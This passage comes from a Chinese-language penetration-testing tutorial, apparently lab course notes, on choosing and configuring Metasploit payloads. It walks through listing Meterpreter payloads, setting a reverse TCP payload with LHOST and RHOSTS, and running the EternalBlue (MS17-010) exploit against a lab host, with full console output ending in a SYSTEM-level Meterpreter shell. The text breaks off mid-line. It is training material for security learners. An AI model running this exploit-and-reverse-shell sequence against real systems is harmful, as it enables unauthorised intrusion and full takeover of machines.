manual  No     Command Shell, Android Reverse HTTPS Stager</span><br><span class="line">   12   android/shell/reverse_tcp                                            manual  No     Command Shell, Android Reverse TCP Stager</span><br><span class="line">   13   apple_ios/aarch64/meterpreter_reverse_http                           manual  No     Apple_iOS Meterpreter, Reverse HTTP Inline</span><br><span class="line">   </span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line">   </span><br><span class="line">   557  windows/x64/vncinject/reverse_tcp                                    manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse TCP Stager</span><br><span class="line">   558  windows/x64/vncinject/reverse_tcp_rc4                                manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   559  windows/x64/vncinject/reverse_tcp_uuid                               manual  No     Windows x64 VNC Server (Reflective Injection), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   560  windows/x64/vncinject/reverse_winhttp                                manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   561  windows/x64/vncinject/reverse_winhttps                               manual  No     Windows x64 VNC Server (Reflective Injection), Windows x64 Reverse HTTPS Stager (winhttp)</span><br></pre></td></tr></table></figure><p>​如上所示，有很多可用的有效载荷可供选择。不仅如此，我们还可以使用创建我们的有效载荷<code>msfvenom</code>，但我们稍后会深入探讨。我们将使用与以前相同的目标，而不是使用默认的有效载荷，这是一个简单的<code>reverse_tcp_shell</code>，我们将使用一个<code>Meterpreter Payload for Windows 7(x64)</code>.</p><p>滚动上面的列表，我们找到包含<code>Meterpreter Payloads for Windows(x64)</code>.</p><p> MSF - 列出有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">515  windows/x64/meterpreter/bind_ipv6_tcp                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">516  windows/x64/meterpreter/bind_ipv6_tcp_uuid                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">517  windows/x64/meterpreter/bind_named_pipe                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">518  windows/x64/meterpreter/bind_tcp                                     manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">519  windows/x64/meterpreter/bind_tcp_rc4                                 manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">520  windows/x64/meterpreter/bind_tcp_uuid                                manual  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">521  windows/x64/meterpreter/reverse_http                                 manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">522  windows/x64/meterpreter/reverse_https                                manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">523  windows/x64/meterpreter/reverse_named_pipe                           manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">524  windows/x64/meterpreter/reverse_tcp                                  manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">525  windows/x64/meterpreter/reverse_tcp_rc4                              manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">526  windows/x64/meterpreter/reverse_tcp_uuid                             manual  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">527  windows/x64/meterpreter/reverse_winhttp                              manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">528  windows/x64/meterpreter/reverse_winhttps                             manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line">529  windows/x64/meterpreter_bind_named_pipe                              manual  No     Windows Meterpreter Shell, Bind Named Pipe Inline (x64)</span><br><span class="line">530  windows/x64/meterpreter_bind_tcp                                     manual  No     Windows Meterpreter Shell, Bind TCP Inline (x64)</span><br><span class="line">531  windows/x64/meterpreter_reverse_http                                 manual  No     Windows Meterpreter Shell, Reverse HTTP Inline (x64)</span><br><span class="line">532  windows/x64/meterpreter_reverse_https                                manual  No     Windows Meterpreter Shell, Reverse HTTPS Inline (x64)</span><br><span class="line">533  windows/x64/meterpreter_reverse_ipv6_tcp                             manual  No     Windows Meterpreter Shell, Reverse TCP Inline (IPv6) (x64)</span><br><span class="line">534  windows/x64/meterpreter_reverse_tcp                                  manual  No     Windows Meterpreter Shell, Reverse TCP Inline x64</span><br></pre></td></tr></table></figure><p>正如我们所见，在如此庞大的列表中找到所需的有效负载可能非常耗时。我们还可以使用<code>grep</code>in<code>msfconsole</code>来过滤掉特定的术语。这将加快搜索速度，从而加快我们的选择速度。</p><p>我们必须<code>grep</code>在开头输入带有相应参数的命令，然后输入要进行过滤的命令。例如，让我们假设我们希望为我们的漏洞利用处理一个<code>TCP</code>基础。因此，我们可以首先搜索有效负载中包含该词的所有结果。<code>reverse shell``Meterpreter``Meterpreter</code></p><h4 id="MSF-搜索特定有效载荷"><a href="#MSF-搜索特定有效载荷" class="headerlink" title="MSF - 搜索特定有效载荷"></a>MSF - 搜索特定有效载荷</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter show payloads</span><br><span class="line"></span><br><span class="line">   6   payload/windows/x64/meterpreter/bind_ipv6_tcp                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager</span><br><span class="line">   7   payload/windows/x64/meterpreter/bind_ipv6_tcp_uuid                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support</span><br><span class="line">   8   payload/windows/x64/meterpreter/bind_named_pipe                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager</span><br><span class="line">   9   payload/windows/x64/meterpreter/bind_tcp                             normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind TCP Stager</span><br><span class="line">   10  payload/windows/x64/meterpreter/bind_tcp_rc4                         normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   11  payload/windows/x64/meterpreter/bind_tcp_uuid                        normal  No     Windows Meterpreter (Reflective Injection x64), Bind TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   12  payload/windows/x64/meterpreter/reverse_http                         normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   13  payload/windows/x64/meterpreter/reverse_https                        normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (wininet)</span><br><span class="line">   14  payload/windows/x64/meterpreter/reverse_named_pipe                   normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse Named Pipe (SMB) Stager</span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   18  payload/windows/x64/meterpreter/reverse_winhttp                      normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTP Stager (winhttp)</span><br><span class="line">   19  payload/windows/x64/meterpreter/reverse_winhttps                     normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse HTTPS Stager (winhttp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter show payloads</span><br><span class="line"></span><br><span class="line">[*] 14</span><br></pre></td></tr></table></figure><p>这给了我们一个总的<code>14</code>结果。现在我们可以在第一个命令之后添加另一个<code>grep</code>命令并搜索<code>reverse_tcp</code>.</p><p> MSF - 搜索特定有效载荷</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line">   </span><br><span class="line">   </span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep -c meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">[*] 3</span><br></pre></td></tr></table></figure><p>在 的帮助下<code>grep</code>，我们将我们想要的有效载荷列表减少到更少。当然，该<code>grep</code>命令可用于所有其他命令。我们只需要知道我们在寻找什么。</p><h2 id="选择有效载荷"><a href="#选择有效载荷" class="headerlink" title="选择有效载荷"></a>选择有效载荷</h2><p>与模块一样，我们需要我们想要使用的条目的索引号。要为当前选定的模块设置有效负载，我们<code>set payload &lt;no.&gt;</code>仅在选择一个漏洞利用模块后才使用。</p><h4 id="MSF-选择负载"><a href="#MSF-选择负载" class="headerlink" title="MSF - 选择负载"></a>MSF - 选择负载</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; grep meterpreter grep reverse_tcp show payloads</span><br><span class="line"></span><br><span class="line">   15  payload/windows/x64/meterpreter/reverse_tcp                          normal  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Reverse TCP Stager</span><br><span class="line">   16  payload/windows/x64/meterpreter/reverse_tcp_rc4                      normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager (RC4 Stage Encryption, Metasm)</span><br><span class="line">   17  payload/windows/x64/meterpreter/reverse_tcp_uuid                     normal  No     Windows Meterpreter (Reflective Injection x64), Reverse TCP Stager with UUID Support (Windows x64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload 15</span><br><span class="line"></span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure><p>选择有效载荷后，我们将有更多选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; show options</span><br><span class="line"></span><br><span class="line">Module options (exploit/windows/smb/ms17_010_eternalblue):</span><br><span class="line"></span><br><span class="line">   Name           Current Setting  Required  Description</span><br><span class="line">   ----           ---------------  --------  -----------</span><br><span class="line">   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax &#x27;file:&lt;path&gt;&#x27;</span><br><span class="line">   RPORT          445              yes       The target port (TCP)</span><br><span class="line">   SMBDomain      .                no        (Optional) The Windows domain to use for authentication</span><br><span class="line">   SMBPass                         no        (Optional) The password for the specified username</span><br><span class="line">   SMBUser                         no        (Optional) The username to authenticate as</span><br><span class="line">   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.</span><br><span class="line">   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Payload options (windows/x64/meterpreter/reverse_tcp):</span><br><span class="line"></span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  thread           yes       Exit technique (Accepted: &#x27;&#x27;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Exploit target:</span><br><span class="line"></span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Windows 7 and Server 2008 R2 (x64) All Service Packs</span><br></pre></td></tr></table></figure><p>正如我们所见，通过<code>show payloads</code>在 Exploit 模块本身中运行命令，msfconsole 检测到目标是 Windows 机器，因此只显示针对 Windows 操作系统的有效负载。</p><p>我们还可以看到出现了一个新的选项字段，它与有效负载参数将包含的内容直接相关。我们将关注<code>LHOST</code>和<code>LPORT</code>（我们的攻击者 IP 和反向连接初始化所需的端口）。当然，如果攻击失败，我们总是可以使用不同的端口并重新发起攻击。</p><h2 id="使用负载"><a href="#使用负载" class="headerlink" title="使用负载"></a>使用负载</h2><p>是时候为 Exploit 模块和 payload 模块设置我们的参数了。对于利用部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>RHOSTS</code></td><td>远程主机的 IP 地址，目标机器。</td></tr><tr><td><code>RPORT</code></td><td>不需要更改，只需检查我们是否在运行 SMB 的端口 445 上。</td></tr></tbody></table><p>对于有效负载部分，我们需要设置以下内容：</p><table><thead><tr><th><strong>范围</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>LHOST</code></td><td>主机的IP地址，攻击者的机器。</td></tr><tr><td><code>LPORT</code></td><td>不需要更改，只需检查端口是否已被使用。</td></tr></tbody></table><p>如果我们想快速查看我们的 LHOST IP 地址，我们总是可以<code>ifconfig</code>直接从 msfconsole 菜单中调用该命令。</p><h4 id="MSF-利用和有效负载配置"><a href="#MSF-利用和有效负载配置" class="headerlink" title="MSF - 利用和有效负载配置"></a>MSF - 利用和有效负载配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(**windows/smb/ms17_010_eternalblue**) &gt; ifconfig</span><br><span class="line"></span><br><span class="line">**[\*]** exec: ifconfig</span><br><span class="line"></span><br><span class="line">tun0: flags=4305&lt;UP,POINTOPOINT,RUNNING,NOARP,MULTICAST&gt; mtu 1500</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line">inet 10.10.14.15 netmask 255.255.254.0 destination 10.10.14.15</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set LHOST 10.10.14.15</span><br><span class="line"></span><br><span class="line">LHOST =&gt; 10.10.14.15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 10.10.10.40</span><br><span class="line"></span><br><span class="line">RHOSTS =&gt; 10.10.10.40</span><br></pre></td></tr></table></figure><p>然后，我们可以运行漏洞并查看它返回的内容。查看以下输出中的差异：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(windows/smb/ms17_010_eternalblue) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 10.10.14.15:4444 </span><br><span class="line">[*] 10.10.10.40:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check</span><br><span class="line">[+] 10.10.10.40:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)</span><br><span class="line">[*] 10.10.10.40:445       - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] 10.10.10.40:445 - Connecting to target for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Connection established for exploitation.</span><br><span class="line">[+] 10.10.10.40:445 - Target OS selected valid for OS indicated by SMB reply</span><br><span class="line">[*] 10.10.10.40:445 - CORE raw buffer dump (42 bytes)</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv</span><br><span class="line">[*] 10.10.10.40:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      </span><br><span class="line">[+] 10.10.10.40:445 - Target arch selected valid for arch indicated by DCE/RPC reply</span><br><span class="line">[*] 10.10.10.40:445 - Trying exploit with 12 Groom Allocations.</span><br><span class="line">[*] 10.10.10.40:445 - Sending all but last fragment of exploit packet</span><br><span class="line">[*] 10.10.10.40:445 - Starting non-paged pool grooming</span><br><span class="line">[+] 10.10.10.40:445 - Sending SMBv2 buffers</span><br><span class="line">[+] 10.10.10.40:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.</span><br><span class="line">[*] 10.10.10.40:445 - Sending final SMBv2 buffers.</span><br><span class="line">[*] 10.10.10.40:445 - Sending last fragment of exploit packet!</span><br><span class="line">[*] 10.10.10.40:445 - Receiving response from exploit packet</span><br><span class="line">[+] 10.10.10.40:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!</span><br><span class="line">[*] 10.10.10.40:445 - Sending egg to corrupted connection.</span><br><span class="line">[*] 10.10.10.40:445 - Triggering free of corrupted buffer.</span><br><span class="line">[*] Sending stage (201283 bytes) to 10.10.10.40</span><br><span class="line">[*] Meterpreter session 1 opened (10.10.14.15:4444 -&gt; 10.10.10.40:49158) at 2020-08-14 11:25:32 +0000</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line">[+] 10.10.10.40:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">meterpreter &gt; whoami</span><br><span class="line"></span><br><span class="line">[-] Unknown command: whoami.</span><br><span class="line"></span><br><span class="line">meterpreter &gt; getuid</span><br><span class="line"></span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br></pre></td></tr></table></figure><p>​该提示不是 Windows 命令行提示，而是<code>Meterpreter</code>提示符。通常用于 Windows 的命令<code>whoami</code>在这里不起作用。相反，我们可以使用 Linux 等效的<code>getuid</code>. 探索<code>help</code>菜单让我们更深入地了解 Meterpreter 有效载荷的能力。</p><h4 id="MSF-Meterpreter-命令"><a href="#MSF-Meterpreter-命令" class="headerlink" title="MSF - Meterpreter 命令"></a>MSF - Meterpreter 命令</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; help</span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                当前会话的背景</span><br><span class="line">    bg                        Alias for background</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of Unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of Unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    guid                      Get the session GUID</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    IRB                       Open an interactive Ruby shell on the current session</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    pivot                     Manage pivot listeners</span><br><span class="line">    pry                       Open the Pry debugger on the current session</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    secure                    (Re)Negotiate TLV packet encryption on the session</span><br><span class="line">    sessions                  Quickly switch to another session</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go 